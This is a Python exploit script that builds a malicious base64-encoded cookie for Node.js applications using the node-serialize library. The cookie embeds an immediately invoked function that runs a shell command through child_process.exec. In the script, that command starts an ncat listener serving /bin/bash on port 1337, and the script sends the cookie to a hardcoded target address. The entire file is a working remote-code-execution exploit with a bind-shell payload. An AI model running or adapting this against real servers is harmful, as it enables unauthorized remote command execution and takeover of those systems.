# auto-inject.py
# 
# This script takes no arguments
# This script creates a bad cookie based off the command given
# and injects javascript into the back-end of webserver
# and executes command (Linux command)
# 
# ! Must use node-serialize lib on backend for exploit to work !
# 
# e.g python auto-inject.py 

import requests
import base64
import json

# target
webserver_url = 'http://192.168.2.201:8090'

# target/app
app_endpoint = webserver_url + '/app'

# username str for post params
# javascript for injection 

# command we want execute
command = 'ncat -lk -e "/bin/bash" 1337 &'
# concat command into exploit function
user_str = "_$$ND_FUNC$$_function (){const { exec } = require('child_process'); exec('" + command + "', (err, stdout, stderr) => {console.log(stdout); console.log(stderr)} )}()"


print('Target: {}'.format(webserver_url))
print('Command selected: {}'.format(command))
print('Creating bad cookie...')

# create cookie dict using exploit function str and cookie name 'user'
cookie_dict = {'u': user_str}

# convert cookie dict to str
cookie_str = json.dumps(cookie_dict)

# encode cookie dict str into base64 str
ascii_cookie_bytes = cookie_str.encode('ascii')
base64_cookie_bytes = base64.b64encode(ascii_cookie_bytes)
encoded_cookie_str = base64_cookie_bytes.decode('ascii')

bad_cookie = {'user': encoded_cookie_str}

print('Bad cookie created:')
print()
print(bad_cookie)
print()

print('Trying Injection...')
response = requests.get(app_endpoint, cookies=bad_cookie)
status_code = response.status_code

if status_code == 200:
    print('Successful response, try connecting :)')
else:
    print('Failed :(')
